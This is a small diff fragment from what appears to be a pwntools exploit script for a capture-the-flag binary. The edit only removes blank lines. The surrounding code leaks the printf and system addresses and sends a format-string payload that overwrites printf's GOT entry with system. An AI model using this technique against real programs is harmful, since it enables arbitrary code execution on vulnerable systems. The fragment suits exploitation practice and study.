@@ -40,12 +40,7 @@ print '[+]printf: ' + hex(printf_addr)
 print '[+]system: ' + hex(system_addr)
 # print '[+]binsh: ' + hex(binsh_addr)
 
-
-
-
 p.sendline('a')
-
-
 
 p.recvuntil('name:')
 p.sendline(fmtstr_payload(46, {elf.got['printf']: system_addr}, write_size='byte').ljust(103))
